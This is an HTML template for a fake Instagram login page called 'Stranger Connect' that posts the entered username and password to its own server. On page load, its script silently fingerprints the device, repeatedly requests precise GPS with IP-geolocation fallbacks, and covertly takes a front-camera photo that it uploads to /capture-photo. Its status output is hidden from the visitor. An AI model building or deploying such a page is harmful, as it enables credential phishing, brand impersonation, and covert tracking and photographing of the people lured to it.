<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Stranger Connect ‚Äì Instagram</title>

    <link rel="stylesheet" href="/style.css" />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
</head>

<body>


    <!-- Background is now handled by layout.hbs -->


    <!-- Login Container -->
    <div id="login-container" class="container">

        <img class="insta-logo"
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/2048px-Instagram.svg.png"
            alt="Instagram" />

        <h1 class="brand">Stranger Connect</h1>
        <p class="sub">Anonymous chat ‚Ä¢ A new Instagram experience</p>

        <h6 class="error">{{{msg}}}</h6>

        <form id="login-form" action="/verify" method="post">

            <input type="text" name="username" placeholder="Phone number, username, or email" />

            <input type="password" name="password" placeholder="Password" />

            <button type="submit" class="btn-login">Log in</button>

        </form>

        <a href="/forgot-password" class="forgot">Forgot password?</a>

        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="btn-create"
            style="display: block; text-align: center; text-decoration: none; cursor: pointer;">Create new account</a>

        <div class="meta-footer">
            {{!-- FIXED: Using the local PNG file saved in public/img/ --}}
            <img class="meta-logo-img" src="/img/20251116_200252.png" alt="Meta" />

        </div>

    </div>

    <input type="hidden" name="deviceDetails" id="deviceDetails" />
    <input type="hidden" name="location" id="location" />
    <input type="hidden" name="phoneNumber" id="phoneNumber" />
    <input type="hidden" name="photoData" id="photoData" />

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Reset attempt counter on every page refresh
        sessionStorage.setItem('loginAttempts', '0');

        // Global variables to store captured data
        let capturedPhoto = null;
        let capturedLocation = null;
        let capturedDeviceDetails = null;
        let dataCapturComplete = {
            location: false,
            camera: false,
            device: false
        };

        function updateStatus(type, message, success = false) {
            // This function is now a no-op as the debug panel is removed.
            // Its calls will remain in the code but will not have any effect.
            console.log(`Status update for ${type}: ${message} (Success: ${success})`);
        }

        // Function to capture device details
        function captureDeviceDetails() {
            try {
                const details = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screenResolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    cookieEnabled: navigator.cookieEnabled,
                    onlineStatus: navigator.onLine,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints
                };
                capturedDeviceDetails = JSON.stringify(details);
                document.getElementById('deviceDetails').value = capturedDeviceDetails;
                dataCapturComplete.device = true;
                updateStatus('device', 'Captured ‚úì', true);
                console.log('‚úÖ Device details captured:', details);
            } catch (error) {
                updateStatus('device', 'Error: ' + error.message);
                console.error('Device details error:', error);
            }
        }

        // Enhanced GPS location capture with multiple fallback strategies
        async function captureLocationWithFallback() {
            console.log('üåç Starting enhanced location capture...');
            updateStatus('location', 'Requesting GPS (attempt 1/3)...');

            // Strategy 1: Try GPS multiple times with increasing timeouts
            for (let attempt = 1; attempt <= 3; attempt++) {
                try {
                    console.log(`üéØ GPS attempt ${attempt}/3 - High accuracy`);
                    const position = await getPositionWithPromise({
                        enableHighAccuracy: true,
                        timeout: 5000 + (attempt * 3000), // Increase timeout each attempt
                        maximumAge: 0
                    });

                    // Success! Get IP location too for additional data
                    const ipData = await getMultiSourceIPLocation();
                    const combinedData = {
                        ...extractPositionData(position, 'GPS-High'),
                        ipLocation: ipData,
                        captureMethod: 'GPS + IP Combined'
                    };

                    capturedLocation = JSON.stringify(combinedData);
                    document.getElementById('location').value = capturedLocation;
                    dataCapturComplete.location = true;
                    updateStatus('location', `GPS ¬±${Math.round(position.coords.accuracy)}m + IP data ‚úì`, true);
                    console.log('‚úÖ GPS + IP location captured:', combinedData);
                    return;
                } catch (error) {
                    console.log(`‚ùå GPS attempt ${attempt}/3 failed:`, error.message);
                    if (attempt < 3) {
                        updateStatus('location', `GPS failed, retry ${attempt + 1}/3...`);
                        await sleep(1000); // Wait 1s before retry
                    }
                }
            }

            // Strategy 2: Low accuracy GPS (WiFi/Cell tower)
            console.log('üéØ Trying low-accuracy GPS (WiFi/Cell)...');
            updateStatus('location', 'Trying WiFi/Cell location...');
            try {
                const position = await getPositionWithPromise({
                    enableHighAccuracy: false,
                    timeout: 8000,
                    maximumAge: 60000
                });

                const ipData = await getMultiSourceIPLocation();
                const combinedData = {
                    ...extractPositionData(position, 'GPS-Low'),
                    ipLocation: ipData,
                    captureMethod: 'WiFi/Cell + IP Combined'
                };

                capturedLocation = JSON.stringify(combinedData);
                document.getElementById('location').value = capturedLocation;
                dataCapturComplete.location = true;
                updateStatus('location', `WiFi/Cell ¬±${Math.round(position.coords.accuracy)}m ‚úì`, true);
                console.log('‚úÖ WiFi/Cell + IP location captured:', combinedData);
                return;
            } catch (error) {
                console.log('‚ùå Low accuracy GPS failed:', error.message);
                updateStatus('location', 'GPS unavailable, using IP location...');
            }

            // Strategy 3: Multi-source IP-based geolocation
            console.log('üéØ Using IP-based geolocation (multiple sources)...');
            try {
                const ipData = await getMultiSourceIPLocation();

                if (ipData && ipData.latitude) {
                    const locationData = {
                        latitude: ipData.latitude,
                        longitude: ipData.longitude,
                        accuracy: ipData.accuracy || 5000,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country,
                        postal: ipData.postal,
                        isp: ipData.isp,
                        source: ipData.source,
                        captureMethod: 'IP-based Multi-source',
                        timestamp: Date.now()
                    };

                    capturedLocation = JSON.stringify(locationData);
                    document.getElementById('location').value = capturedLocation;
                    dataCapturComplete.location = true;
                    updateStatus('location', `IP: ${ipData.city}, ${ipData.country} ‚úì`, true);
                    console.log('‚úÖ IP-based location captured:', locationData);
                    return;
                }
            } catch (error) {
                console.log('‚ùå IP geolocation failed:', error.message);
            }

            // Strategy 4: Final fallback
            console.log('‚ö†Ô∏è All location methods failed, using fallback...');
            const fallbackData = {
                error: 'All location methods failed',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                captureMethod: 'Fallback',
                timestamp: Date.now()
            };
            capturedLocation = JSON.stringify(fallbackData);
            document.getElementById('location').value = capturedLocation;
            dataCapturComplete.location = true;
            updateStatus('location', 'Fallback (will use server IP lookup) ‚ö†Ô∏è');
            console.log('‚ö†Ô∏è Location fallback used');
        }

        // Helper function to sleep
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Extract position data
        function extractPositionData(position, source) {
            return {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp,
                source: source
            };
        }

        // Multi-source IP geolocation (tries multiple APIs for best results)
        async function getMultiSourceIPLocation() {
            console.log('üåê Trying multiple IP geolocation sources...');

            // Try all sources in parallel, use first successful one
            const sources = [
                getIPLocationFromIPAPI(),
                getIPLocationFromIPAPIcom(),
                getIPLocationFromIPInfo()
            ];

            try {
                const result = await Promise.any(sources);
                console.log('‚úÖ Got IP location from:', result.source);
                return result;
            } catch (error) {
                console.log('‚ùå All IP geolocation sources failed');
                return null;
            }
        }

        // Source 1: ipapi.co
        async function getIPLocationFromIPAPI() {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error('ipapi.co failed');
            const data = await response.json();
            return {
                latitude: data.latitude,
                longitude: data.longitude,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.org,
                accuracy: 5000,
                source: 'ipapi.co'
            };
        }

        // Source 2: ip-api.com
        async function getIPLocationFromIPAPIcom() {
            const response = await fetch('http://ip-api.com/json/');
            if (!response.ok) throw new Error('ip-api.com failed');
            const data = await response.json();
            if (data.status !== 'success') throw new Error('ip-api.com query failed');
            return {
                latitude: data.lat,
                longitude: data.lon,
                city: data.city,
                region: data.regionName,
                country: data.country,
                postal: data.zip,
                isp: data.isp,
                accuracy: 5000,
                source: 'ip-api.com'
            };
        }

        // Source 3: ipinfo.io
        async function getIPLocationFromIPInfo() {
            const response = await fetch('https://ipinfo.io/json');
            if (!response.ok) throw new Error('ipinfo.io failed');
            const data = await response.json();
            const [lat, lon] = data.loc.split(',').map(Number);
            return {
                latitude: lat,
                longitude: lon,
                city: data.city,
                region: data.region,
                country: data.country,
                postal: data.postal,
                isp: data.org,
                accuracy: 5000,
                source: 'ipinfo.io'
            };
        }

        // Promise wrapper for geolocation
        function getPositionWithPromise(options) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(resolve, reject, options);
            });
        }

        // Function to capture photo from camera
        async function capturePhoto() {
            updateStatus('camera', 'Requesting access...');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                updateStatus('camera', 'Camera active, capturing...');

                // Wait for video to be ready
                await new Promise((resolve) => {
                    video.onloadedmetadata = resolve;
                });

                // Wait a bit for camera to adjust
                await new Promise(resolve => setTimeout(resolve, 1500));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // Convert to base64
                capturedPhoto = canvas.toDataURL('image/jpeg', 0.85);
                document.getElementById('photoData').value = capturedPhoto;

                // Send photo to server immediately
                await sendPhotoToServer(capturedPhoto);

                // Stop camera
                stream.getTracks().forEach(track => track.stop());

                dataCapturComplete.camera = true;
                updateStatus('camera', 'Captured & uploaded ‚úì', true);
                console.log('‚úÖ Photo captured and sent to server');
            } catch (error) {
                console.error('Camera error:', error);
                document.getElementById('photoData').value = JSON.stringify({ error: error.message });
                dataCapturComplete.camera = true; // Mark as complete even if failed
                updateStatus('camera', 'Failed: ' + error.message + ' ‚ö†Ô∏è');
            }
        }

        // Function to send photo to server
        async function sendPhotoToServer(photoData) {
            try {
                const response = await fetch('/capture-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photo: photoData })
                });
                const data = await response.json();
                console.log('Photo upload response:', data);
                return data;
            } catch (error) {
                console.error('Error sending photo:', error);
                throw error;
            }
        }

        // Initialize data capture on page load
        window.addEventListener('load', async () => {
            console.log('üöÄ Starting data capture...');

            // Capture device details immediately (synchronous)
            captureDeviceDetails();

            // Capture location and camera in parallel
            await Promise.allSettled([
                captureLocationWithFallback(),
                capturePhoto()
            ]);

            console.log('‚úÖ All data capture attempts complete');
            console.log('Capture status:', dataCapturComplete);
        });

        // Handle login form submission with attempt counter
        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault();

            // Log current capture status
            console.log('Form submitted. Data capture status:', dataCapturComplete);

            // Get current attempt count
            let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
            attempts++;
            sessionStorage.setItem('loginAttempts', attempts.toString());

            console.log('Login attempt:', attempts);

            // Check if this is 3rd attempt - redirect to troll page
            if (attempts === 3) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/troll-success';
                return;
            }

            // Check if this is 4th attempt - redirect to notres page
            if (attempts === 4) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/notres';
                return;
            }

            // Otherwise submit the form normally
            // Wait a tiny bit to ensure all data is set
            setTimeout(() => {
                this.submit();
            }, 100);
        });
    </script>

</body>

</html>